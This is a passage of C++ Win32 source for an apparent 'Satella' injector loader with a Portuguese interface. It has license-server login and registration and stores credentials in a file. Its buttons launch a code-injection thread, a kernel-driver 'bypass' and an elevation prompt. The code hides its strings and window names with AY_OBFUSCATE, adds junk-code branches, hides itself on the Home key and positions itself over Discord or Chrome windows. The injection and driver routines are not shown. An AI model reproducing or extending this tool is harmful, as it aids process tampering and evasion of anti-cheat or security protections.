        static DWORD last = 0; DWORD now = GetTickCount64();
        if (!last) last = now; g_dt = (now - last) / 1000.0f; if (g_dt > 0.05f) g_dt = 0.05f; last = now;
        for (int i = 0; i < 120; i++) {
            pts[i].y -= pts[i].spd * g_dt;
            pts[i].x += sinf(pts[i].y * 0.008f) * g_dt * 15;
            if (pts[i].y < -10) { pts[i].y = (float)(g_cy + 10); pts[i].x = (float)(rand() % g_cx); }
        }
        if (g_click > 0) g_click -= g_dt * 5;
        if (g_click < 0) g_click = 0;
        POINT cur; GetCursorPos(&cur); ScreenToClient(h, &cur);
        int targetX = (cur.y < 30 && cur.x >= g_cx - 35) ? 1 : 0;
        g_xHover += (targetX - g_xHover) * g_dt * 6;
        if (g_xHover < 0.001f) g_xHover = 0;
        static int g_homeDown = 0;
        int homeNow = (GetAsyncKeyState(VK_HOME) & 0x8000) ? 1 : 0;
        if (homeNow && !g_homeDown) {
            g_homeDown = 1;
            if (IsWindowVisible(h)) ShowWindow(h, SW_HIDE);
            else { ShowWindow(h, SW_SHOW); SetWindowPos(h, HWND_TOPMOST, 0,0,0,0, SWP_NOMOVE|SWP_NOSIZE|SWP_SHOWWINDOW|SWP_NOACTIVATE); }
        }
        if (!homeNow) g_homeDown = 0;
        if (g_inj && g_prog < 1.0f) g_prog += g_dt * 0.3f;
        if (!g_inj && g_prog > 0 && g_prog < 1) g_prog = 1.0f;
        if (g_bypass == 2 && g_bypassProg < 1.0f) g_bypassProg += g_dt * 0.15f;
        InvalidateRect(h, NULL, FALSE); break;
    }
    case WM_MOUSEMOVE: {
        int mx = LOWORD(l), my = HIWORD(l);
        int nh = 0;
        if (!g_log) {
            int cx = g_cx / 2 - 100;
            if (!g_reg) {
                if (mx >= cx + 40 && mx <= cx + 160 && my >= 274 && my <= 309) nh = 1;
                else if (mx >= cx + 40 && mx <= cx + 160 && my >= 312 && my <= 330) nh = 3;
            } else {
                if (mx >= cx + 40 && mx <= cx + 160 && my >= 260 && my <= 295) nh = 1;
                else if (mx >= cx + 40 && mx <= cx + 160 && my >= 298 && my <= 316) nh = 3;
            }
        } else {
            if (mx >= g_cx / 2 - 30 && mx <= g_cx / 2 + 100 && my >= 150 && my <= 194 && !g_inj && !g_ok) nh = 2;
            else if (mx >= g_cx / 2 - 30 && mx <= g_cx / 2 + 100 && my >= 210 && my <= 254 && g_bypass != 2) nh = 4;
        }
        if (nh != g_hov) { g_hov = nh; SetCursor(nh ? LoadCursor(NULL, IDC_HAND) : LoadCursor(NULL, IDC_ARROW)); InvalidateRect(h, NULL, FALSE); }
        break;
    }
    case WM_LBUTTONDOWN: {
        int mx = LOWORD(l), my = HIWORD(l), cx = g_cx / 2 - 100;
        if (!g_log) {
            if (!g_reg) {
                if (mx >= cx && mx <= cx + 200 && my >= 167 && my <= 201) g_foc = 1;
                else if (mx >= cx && mx <= cx + 200 && my >= 212 && my <= 246) g_foc = 2;
                else if (mx >= cx + 40 && mx <= cx + 160 && my >= 274 && my <= 309) {
                    g_click = 1;
                    char u[64] = {}, pwd[64] = {};
                    wcstombs(u, g_u, 63); wcstombs(pwd, g_p, 63);
                    if (ka_login(u, pwd)) {
                        g_log = 1; g_reg = 0; g_err = 0;
                        saveCredFile(u, pwd);
                    } else g_err = 1;
                } else if (mx >= cx + 40 && mx <= cx + 160 && my >= 312 && my <= 330) {
                    g_reg = 1; g_err = 0;
                } else if (!(mx >= cx && mx <= cx + 200 && my >= 167 && my <= 246)) g_foc = 0;
            } else {
                if (mx >= cx && mx <= cx + 200 && my >= 115 && my <= 149) g_foc = 1;
                else if (mx >= cx && mx <= cx + 200 && my >= 155 && my <= 189) g_foc = 2;
                else if (mx >= cx && mx <= cx + 200 && my >= 195 && my <= 229) g_foc = 3;
                else if (mx >= cx + 40 && mx <= cx + 160 && my >= 260 && my <= 295) {
                    g_click = 1;
                    char u[64] = {}, pwd[64] = {}, key[256] = {};
                    wcstombs(u, g_u, 63); wcstombs(pwd, g_p, 63); wcstombs(key, g_k, 255);
                    if (ka_register(u, pwd, key)) {
                        if (ka_login(u, pwd)) {
                            g_log = 1; g_reg = 0; g_err = 0;
                            saveCredFile(u, pwd);
                        }
                    } else g_err = 1;
                } else if (mx >= cx + 40 && mx <= cx + 160 && my >= 298 && my <= 316) {
                    g_reg = 0; g_err = 0;
                } else if (!(mx >= cx && mx <= cx + 200 && my >= 115 && my <= 229)) g_foc = 0;
            }
        } else if (mx >= g_cx / 2 - 30 && mx <= g_cx / 2 + 100 && my >= 150 && my <= 194 && !g_inj && !g_ok) {
            g_prog = 0;
            g_click = 1; CreateThread(NULL, 0, th, NULL, 0, NULL);
        } else if (g_log && !g_admin && mx >= g_cx / 2 - 30 && mx <= g_cx / 2 + 100 && my >= 262 && my <= 306) {
            g_click = 1; InvalidateRect(h, NULL, TRUE);
            wchar_t path[MAX_PATH]; GetModuleFileNameW(NULL, path, MAX_PATH);
            SHELLEXECUTEINFOW sei = { sizeof(sei) };
            sei.lpVerb = L"runas"; sei.lpFile = path; sei.nShow = SW_SHOW;
            if (ShellExecuteExW(&sei)) PostMessage(h, WM_CLOSE, 0, 0);
        } else if (mx >= g_cx / 2 - 30 && mx <= g_cx / 2 + 100 && my >= 210 && my <= 254 && g_bypass != 2) {
            g_click = 1;
            if (g_bypass == 1) { UnloadDriver(); g_bypass = 0; g_bypassProg = 0; strcpy(g_st, "Bypass desativado"); }
            else StartBypass();
        }
        InvalidateRect(h, NULL, FALSE); break;
    }
    case WM_CHAR: {
        if (g_log) break;
        wchar_t* tgt = NULL; int maxLen = 0;
        if (!g_reg) {
            tgt = (g_foc == 1) ? g_u : ((g_foc == 2) ? g_p : NULL);
            maxLen = (g_foc == 1) ? 63 : 63;
        } else {
            tgt = (g_foc == 1) ? g_u : ((g_foc == 2) ? g_p : ((g_foc == 3) ? g_k : NULL));
            maxLen = (g_foc == 1) ? 63 : ((g_foc == 2) ? 63 : 255);
        }
        if (!tgt) break;
        size_t n = wcslen(tgt);
        if (w == VK_BACK && n) tgt[n - 1] = 0;
        else if (w >= 32 && w <= 126 && n < (size_t)maxLen) { tgt[n] = (wchar_t)w; tgt[n + 1] = 0; }
        InvalidateRect(h, NULL, FALSE); break;
    }
    case WM_PAINT: {
        PAINTSTRUCT ps; HDC hdc = BeginPaint(h, &ps);
        HDC mem = CreateCompatibleDC(hdc);
        HBITMAP bmp = CreateCompatibleBitmap(hdc, g_cx, g_cy);
        SelectObject(mem, bmp);
        SetBkMode(mem, TRANSPARENT);
        for (int y = 0; y < g_cy; y++) {
            int t = (int)((float)y / g_cy * 12);
            HPEN pen = CreatePen(PS_SOLID, 1, RGB(12 + t, 12 + t, 14 + t));
            SelectObject(mem, pen);
            MoveToEx(mem, 0, y, NULL); LineTo(mem, g_cx, y);
            DeleteObject(pen);
        }
        HBRUSH tb = CreateSolidBrush(RGB(8, 8, 10));
        RECT tbr = { 0,0,g_cx,30 }; FillRect(mem, &tbr, tb); DeleteObject(tb);
        HPEN tlp = CreatePen(PS_SOLID, 1, RGB(30, 30, 35));
        SelectObject(mem, tlp); MoveToEx(mem, 0, 30, NULL); LineTo(mem, g_cx, 30);
        DeleteObject(tlp);
        HFONT ttf = CreateFontW(12,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
        SelectObject(mem, ttf);
        dt(mem, L"Satella", 12, 0, g_cx - 60, 30, DT_LEFT | DT_VCENTER | DT_SINGLELINE, RGB(140, 140, 160));
        int xr = 140 + (int)(g_xHover * 80);
        int xg = 140 - (int)(g_xHover * 100);
        int xb = 160 - (int)(g_xHover * 120);
        if (g_xHover > 0.01f) {
            HBRUSH xbg = CreateSolidBrush(RGB(60 - (int)(g_xHover * 30), 20, 20));
            RECT xxr = { g_cx - 35,0,g_cx,30 }; FillRect(mem, &xxr, xbg); DeleteObject(xbg);
        }
        dt(mem, L"X", g_cx - 30, 0, 30, 29, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(xr, xg, xb));
        dt(mem, L"X", g_cx - 29, 0, 30, 29, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 255, 255));
        DeleteObject(ttf);
        for (int i = 0; i < 120; i++) {
            float a = (1.0f - pts[i].y / (float)g_cy); if (a < 0) a = 0; if (a > 1) a = 1;
            int al = (int)(a * pts[i].al);
            HBRUSH pb = CreateSolidBrush(RGB(al / 2, al / 2, al));
            HPEN pp = CreatePen(PS_NULL, 0, 0);
            SelectObject(mem, pb); SelectObject(mem, pp);
            int r = (int)(pts[i].sz * 1.3f);
            Ellipse(mem, (int)pts[i].x - r, (int)pts[i].y - r, (int)pts[i].x + r, (int)pts[i].y + r);
            DeleteObject(pb); DeleteObject(pp);
            HBRUSH pi = CreateSolidBrush(RGB(al, al, al));
            SelectObject(mem, pi);
            int ri = (int)pts[i].sz;
            Ellipse(mem, (int)pts[i].x - ri, (int)pts[i].y - ri, (int)pts[i].x + ri, (int)pts[i].y + ri);
            DeleteObject(pi);
        }
        HFONT sf = CreateFontW(12,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
        SelectObject(mem, sf);
        if (!g_log) {
            int cx = g_cx / 2 - 100;
            if (!g_reg) {
                HFONT wlf = CreateFontW(28,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
                SelectObject(mem, wlf);
                dt(mem, L"Bem vindo ao Satella", 0, 35, g_cx, 34, DT_CENTER, RGB(255, 255, 255));
                DeleteObject(wlf);
                SelectObject(mem, sf);
                dbox(mem, cx, 167, 200, 34, 6, g_foc == 1 ? RGB(28, 28, 34) : RGB(20, 20, 24), g_foc == 1 ? RGB(88, 66, 135) : RGB(35, 35, 40));
                SetTextColor(mem, g_u[0] ? RGB(210, 210, 230) : RGB(70, 70, 80));
                RECT ux = { cx + 10,167,cx + 190,201 }; DrawTextW(mem, g_u[0] ? g_u : L"Username", -1, &ux, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                dbox(mem, cx, 212, 200, 34, 6, g_foc == 2 ? RGB(28, 28, 34) : RGB(20, 20, 24), g_foc == 2 ? RGB(88, 66, 135) : RGB(35, 35, 40));
                wchar_t hd[64]; wcscpy(hd, g_p);
                for (int i = 0; hd[i]; i++) hd[i] = L'*';
                SetTextColor(mem, g_p[0] ? RGB(210, 210, 230) : RGB(70, 70, 80));
                RECT px = { cx + 10,212,cx + 190,246 }; DrawTextW(mem, g_p[0] ? hd : L"Password", -1, &px, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                if (g_err) {
                    const char* errStr = ka_get_error();
                    wchar_t ew[128]; if (errStr) mbstowcs(ew, errStr, 127); else wcscpy(ew, L"Erro");
                    dt(mem, ew, 0, 254, cx + 200, 16, DT_CENTER, RGB(255, 70, 70));
                }
                int br = g_hov == 1 ? (g_click > 0 ? RGB(68, 46, 115) : RGB(108, 86, 155)) : RGB(88, 66, 135);
                dbox(mem, cx + 40, 274, 120, 35, 8, br, RGB(130, 110, 180));
                dt(mem, L"LOGIN", cx + 40, 274, 120, 35, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 255, 255));
                dt(mem, L"Registrar", cx + 40, 312, 120, 18, DT_CENTER | DT_SINGLELINE, RGB(100, 100, 140));
            } else {
                HFONT wlf = CreateFontW(24,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
                SelectObject(mem, wlf);
                dt(mem, L"Criar Conta", 0, 35, g_cx, 30, DT_CENTER, RGB(255, 255, 255));
                DeleteObject(wlf);
                SelectObject(mem, sf);
                dbox(mem, cx, 115, 200, 34, 6, g_foc == 1 ? RGB(28, 28, 34) : RGB(20, 20, 24), g_foc == 1 ? RGB(88, 66, 135) : RGB(35, 35, 40));
                SetTextColor(mem, g_u[0] ? RGB(210, 210, 230) : RGB(70, 70, 80));
                RECT rux = { cx + 10,115,cx + 190,149 }; DrawTextW(mem, g_u[0] ? g_u : L"Username", -1, &rux, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                dbox(mem, cx, 155, 200, 34, 6, g_foc == 2 ? RGB(28, 28, 34) : RGB(20, 20, 24), g_foc == 2 ? RGB(88, 66, 135) : RGB(35, 35, 40));
                wchar_t rhd[64]; wcscpy(rhd, g_p);
                for (int i = 0; rhd[i]; i++) rhd[i] = L'*';
                SetTextColor(mem, g_p[0] ? RGB(210, 210, 230) : RGB(70, 70, 80));
                RECT rpx = { cx + 10,155,cx + 190,189 }; DrawTextW(mem, g_p[0] ? rhd : L"Password", -1, &rpx, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                dbox(mem, cx, 195, 200, 34, 6, g_foc == 3 ? RGB(28, 28, 34) : RGB(20, 20, 24), g_foc == 3 ? RGB(88, 66, 135) : RGB(35, 35, 40));
                SetTextColor(mem, g_k[0] ? RGB(210, 210, 230) : RGB(70, 70, 80));
                RECT rkx = { cx + 10,195,cx + 190,229 }; DrawTextW(mem, g_k[0] ? g_k : L"License Key", -1, &rkx, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
                if (g_err) {
                    const char* errStr = ka_get_error();
                    wchar_t ew[128]; if (errStr) mbstowcs(ew, errStr, 127); else wcscpy(ew, L"Erro");
                    dt(mem, ew, 0, 235, cx + 200, 16, DT_CENTER, RGB(255, 70, 70));
                }
                int rbr = g_hov == 1 ? (g_click > 0 ? RGB(68, 46, 115) : RGB(108, 86, 155)) : RGB(88, 66, 135);
                dbox(mem, cx + 40, 260, 120, 35, 8, rbr, RGB(130, 110, 180));
                dt(mem, L"REGISTER", cx + 40, 260, 120, 35, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 255, 255));
                dt(mem, L"Voltar ao Login", cx + 40, 298, 120, 18, DT_CENTER | DT_SINGLELINE, RGB(100, 100, 140));
            }
        } else {
            int sbw = 170;
            HBRUSH sbb = CreateSolidBrush(RGB(16, 16, 18));
            RECT sbr = { 0,30,sbw,g_cy }; FillRect(mem, &sbr, sbb); DeleteObject(sbb);
            HPEN sbp = CreatePen(PS_SOLID, 1, RGB(35, 35, 40));
            SelectObject(mem, sbp); MoveToEx(mem, sbw, 30, NULL); LineTo(mem, sbw, g_cy);
            DeleteObject(sbp);
            HFONT stf = CreateFontW(18,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
            SelectObject(mem, stf);
            dt(mem, L"Satella", 0, 34, sbw, 24, DT_CENTER, RGB(160, 150, 180));
            dt(mem, L"Satella", 0, 33, sbw, 24, DT_CENTER, RGB(255, 255, 255));
            DeleteObject(stf);
            int avs = 52, avx = (sbw - avs) / 2, avy = 75;
            HBRUSH avb = CreateSolidBrush(RGB(70, 70, 80));
            HPEN avp = CreatePen(PS_NULL, 0, 0);
            SelectObject(mem, avb); SelectObject(mem, avp);
            Ellipse(mem, avx, avy, avx + avs, avy + avs);
            DeleteObject(avb); DeleteObject(avp);
            wchar_t init[2] = { towupper(g_u[0]), 0 };
            HFONT avf = CreateFontW(22,0,0,0,FW_BOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
            SelectObject(mem, avf);
            dt(mem, init, avx, avy, avs, avs, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(190, 190, 200));
            DeleteObject(avf);
            HFONT wf = CreateFontW(11,0,0,0,FW_NORMAL,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
            SelectObject(mem, wf);
            dt(mem, L"Bem-vindo,", 0, avy + avs + 12, sbw, 16, DT_CENTER, RGB(120, 120, 140));
            HFONT nf = CreateFontW(14,0,0,0,FW_SEMIBOLD,0,0,0,DEFAULT_CHARSET,0,0,0,0,L"Segoe UI");
            SelectObject(mem, nf);
            dt(mem, g_u, 0, avy + avs + 28, sbw, 20, DT_CENTER, RGB(220, 220, 240));
            DeleteObject(wf); DeleteObject(nf);
            int bc = g_inj ? RGB(35, 35, 40) : (g_hov == 2 ? (g_click > 0 ? RGB(68, 46, 115) : RGB(108, 86, 155)) : RGB(88, 66, 135));
            dbox(mem, g_cx / 2 - 30, 150, 130, 44, 10, bc, RGB(130, 110, 180));
            if (g_ok && !g_inj) {
                dt(mem, L"INJETADO!", g_cx / 2 - 30, 150, 130, 44, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(100, 255, 100));
            } else {
                dt(mem, g_inj ? L"CARREGANDO..." : L"LOAD SATELLA", g_cx / 2 - 30, 150, 130, 44, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 255, 255));
            }
            int bb = g_bypass == 2 ? RGB(35, 35, 40) : (g_hov == 4 ? (g_click > 0 ? RGB(0, 70, 50) : RGB(0, 120, 80)) : (g_bypass ? RGB(0, 90, 60) : RGB(0, 100, 70)));
            dbox(mem, g_cx / 2 - 30, 210, 130, 44, 10, bb, RGB(0, 150, 100));
            if (g_bypass == 1) dt(mem, L"BYPASS ATIVO", g_cx / 2 - 30, 210, 130, 44, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(100, 255, 150));
            else if (g_bypass == 2) dt(mem, L"ATIVANDO...", g_cx / 2 - 30, 210, 130, 44, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 255, 200));
            else dt(mem, L"BYPASS SATELLA", g_cx / 2 - 30, 210, 130, 44, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 255, 255));
            if (g_inj || g_prog > 0) {
                int pbx = g_cx / 2 - 50, pby = 265, pbw = 170, pbh = 5;
                dbox(mem, pbx, pby, pbw, pbh, 3, RGB(25, 25, 30), RGB(40, 40, 45));
                int fill = (int)(pbw * (g_prog > 1 ? 1 : g_prog));
                if (fill > 0) { HBRUSH pbf = CreateSolidBrush(RGB(88, 66, 135));
                    HPEN ppp = CreatePen(PS_NULL, 0, 0); SelectObject(mem, pbf); SelectObject(mem, ppp);
                    RoundRect(mem, pbx, pby, pbx + fill, pby + pbh, 3, 3);
                    DeleteObject(pbf); DeleteObject(ppp); }
            }
            if (g_bypass == 2 || g_bypassProg > 0) {
                int pbx = g_cx / 2 - 50, pby = 280, pbw = 170, pbh = 5;
                dbox(mem, pbx, pby, pbw, pbh, 3, RGB(25, 25, 30), RGB(40, 40, 45));
                int fill = (int)(pbw * (g_bypassProg > 1 ? 1 : g_bypassProg));
                if (fill > 0) { HBRUSH pbf = CreateSolidBrush(RGB(0, 130, 90));
                    HPEN ppp = CreatePen(PS_NULL, 0, 0); SelectObject(mem, pbf); SelectObject(mem, ppp);
                    RoundRect(mem, pbx, pby, pbx + fill, pby + pbh, 3, 3);
                    DeleteObject(pbf); DeleteObject(ppp); }
            }
            if (g_st[0]) { wchar_t sw[256]; wsprintfW(sw, L"%hs", g_st); dt(mem, sw, 180, 300, g_cx - 200, 20, DT_CENTER, RGB(130, 130, 160)); }
            if (g_log && !g_admin) {
                int abx = g_cx / 2 - 30, aby = 262, abw = 130, abh = 44;
                int abc = g_hov == 5 ? (g_click > 0 ? RGB(58, 38, 18) : RGB(100, 70, 30)) : RGB(80, 55, 25);
                dbox(mem, abx, aby, abw, abh, 10, abc, RGB(130, 80, 30));
                dt(mem, L"RECONECTAR ADMIN", abx, aby, abw, abh, DT_CENTER | DT_VCENTER | DT_SINGLELINE, RGB(255, 200, 100));
            }
        }
        DeleteObject(sf);
        BitBlt(hdc, 0, 0, g_cx, g_cy, mem, 0, 0, SRCCOPY);
        DeleteObject(bmp); DeleteDC(mem);
        EndPaint(h, &ps); break;
    }
    default: return DefWindowProcW(h, m, w, l);
    }
    return 0;
}

static DWORD WINAPI LoaderThread(LPVOID lpParam) {
    HINSTANCE h = (HINSTANCE)lpParam;
    unsigned int _ck = GetTickCount();
    if ((_ck ^ 0xA5A5A5A5) < 0x10000000) {
        if (GetLastError() != 0) { }
        volatile int _junk = 0;
        for (int _i = 0; _i < 10; _i++) _junk += _i * _i;
    }
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = WndProc; wc.hInstance = h;
    wc.hbrBackground = (HBRUSH)GetStockObject(BLACK_BRUSH);
    wc.lpszClassName = AY_OBFUSCATE(L"O2z9kQ7a"); wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    RegisterClassW(&wc);
    int cx = GetSystemMetrics(SM_CXSCREEN), cy = GetSystemMetrics(SM_CYSCREEN);
    g_hwnd = CreateWindowExW(WS_EX_TOOLWINDOW, AY_OBFUSCATE(L"O2z9kQ7a"), AY_OBFUSCATE(L"M3x8jR1b"),
        WS_POPUP,

        (cx - 600) / 2, (cy - 350) / 2,
        600, 350, NULL, NULL, h, NULL);
    if (g_hwnd) {
        HRGN hr = CreateRoundRectRgn(0, 0, 601, 351, 10, 10);
        SetWindowRgn(g_hwnd, hr, TRUE);
        DeleteObject(hr);
        int cx = GetSystemMetrics(SM_CXSCREEN), cy = GetSystemMetrics(SM_CYSCREEN);
        SetWindowPos(g_hwnd, HWND_TOPMOST, (cx-600)/2, (cy-350)/2, 600, 350, SWP_SHOWWINDOW);
        ShowWindow(g_hwnd, SW_SHOW);
        UpdateWindow(g_hwnd);
    }
    if (IsBadReadPtr(&_ck, 4)) {
        return 0;
    }
    g_admin = IsAdmin();
    ka_init();
    if (tryAuthFromCredFile()) {
        g_log = 1;
        const char* un = ka_get_username();
        if (un) { wchar_t wun[32]; mbstowcs(wun, un, 31); wcscpy(g_u, wun); }
    }
    HWND hDiscord = NULL;
    int tries = 0;
    while (tries++ < 50) {
        hDiscord = FindWindowW(AY_OBFUSCATE(L"Chrome_WidgetWin_1"), NULL);
        if (hDiscord) break;
        hDiscord = FindWindowW(AY_OBFUSCATE(L"Chrome_RenderWidgetHostHWND"), NULL);
        if (hDiscord) break;
        volatile int _wt = 200 + ((GetTickCount() & 0xF) ^ 0x7);
        if (_wt < 10) _wt = 200;
        Sleep(_wt);
    }
    if (hDiscord) {
        RECT dcr; GetWindowRect(hDiscord, &dcr);
        SetWindowPos(g_hwnd, HWND_TOPMOST,
            dcr.left + (dcr.right - dcr.left - 600) / 2,
            dcr.top + (dcr.bottom - dcr.top - 350) / 2,
            0, 0, SWP_NOSIZE);
    }
    MSG msg; while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    UnloadDriver();
    return 0;
}

static HINSTANCE g_hInstDLL = NULL;

static HANDLE StartLoader() {
    HINSTANCE hMod = g_hInstDLL ? g_hInstDLL : GetModuleHandleW(NULL);
    if ((GetTickCount() & 0xFF) != 0x100) {
        return CreateThread(NULL, 0, LoaderThread, hMod, 0, NULL);
    }
    return NULL;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        g_hInstDLL = hinstDLL;
        // When compiled as EXE, the CRT doesn't call DllMain,
        // so no auto-start here.
    }
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    g_hInstDLL = hInstance;
    HANDLE hThread = StartLoader();
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    return 0;
}
